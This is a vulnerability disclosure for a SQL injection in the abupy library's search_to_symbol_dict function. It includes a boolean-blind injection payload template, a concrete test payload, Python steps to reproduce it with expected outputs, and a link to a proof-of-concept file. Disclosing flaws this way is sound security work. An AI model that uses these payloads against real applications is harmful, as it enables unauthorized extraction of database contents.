Vulnerability Product: abupy <= v0.4.0  [https://github.com/bbfamily/abu](https://github.com/bbfamily/abu)  
Vulnerability version: <= v0.4.0  
Vulnerability type: SQL Injection  
Vulnerability Details:  
Vulnerability location: abupy.MarketBu.ABuSymbol.search_to_symbol_dict

SQL Injection in abupy <= v0.4.0 causes arbitrary SQL code execution 

## [](#header-3)PROVE: 

Payload: ```"us----' union select case when ({CODE YOU WANNA EXEC, RETURN TRUE OR FALSE}) then 'usJASNW' else 'usTROVW' end where ''='"```  
Test_payload: ```"us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"```  
Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='")```  

Firstly download abupy latest version(v0.4.0)
```
pip install abupy
```

Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument
```py
import abupy.MarketBu.ABuSymbol
print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us----' union select case when (sqlite_version() = '3.31.1') then 'usJASNW' else 'usTROVW' end where ''='"))
```
(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the code annotation of the function, It is legal and normal for users and programmers to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200 code annotation, so users can easily trigger this vulnerability)

Finally you can find the result is `{'JASNW': 'JASON INDS INC'}`  
if you replace `sqlite_version() = '3.31.1'` with `sqlite_version() != '3.31.1'`  
you can find the result is `{'TROVW': 'TROVAGENE INC'}`  
proved the result is determined by payload  
Of course, you can also fill in other relational expressions here to verify the vulnerability, such as `1 = 1`, `1 != 1`, `substr(sqlite_version(),1,1) = '3'`, `substr(sqlite_version(),2,1) = '.'`

proved sql code execution  

POC: https://github.com/Leeyangee/leeya_bug/blob/main/abupy_poc.py

## [](#header-3)HARM: 

Programmers may mistakenly use abupy.MarketBu.ABuSymbol.search_to_symbol_dict in this library as part of the backend of the web application, allowing attackers to call the function and return sensitive database data.  

The above payload is just an example, attackers can construct a complex payload to obtain complete database sensitive information in a way similar to sql blind injection

discovered by leeya_bug
